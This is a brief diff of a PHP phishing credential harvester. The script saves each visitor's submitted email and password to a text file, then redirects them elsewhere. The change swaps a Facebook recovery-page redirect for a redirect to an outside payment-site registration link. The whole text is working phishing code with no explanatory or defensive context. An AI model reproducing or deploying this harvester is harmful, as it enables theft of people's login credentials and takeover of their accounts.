@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
+header('Location: https://www.pay-box.in/home/register?source=eva0u0f0wy');
 exit();
